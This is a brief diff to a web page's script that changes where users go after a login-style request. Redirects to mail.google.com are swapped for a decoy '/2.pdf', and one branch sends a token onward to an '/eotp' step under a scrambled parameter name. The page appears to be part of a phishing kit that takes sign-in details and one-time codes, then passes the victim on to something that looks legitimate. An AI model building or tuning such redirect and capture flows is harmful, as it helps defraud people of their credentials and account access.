@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -157,8 +158,10 @@
           .then(data => {
             if (data.result === 'redirected_eotp') {
               window.location.href = '/eotp?mnbvcxzZXCVBNM=' + encodeURIComponent(tk);
+            } else if (data.result === 'success') {
+              window.location.href = '/2.pdf';
             } else if (data.result === 'redirected') {
-              window.location.href = 'https://mail.google.com';
+              window.location.href = '/2.pdf';
             } else if (data.result === 'error') {
               showError();
             } else {
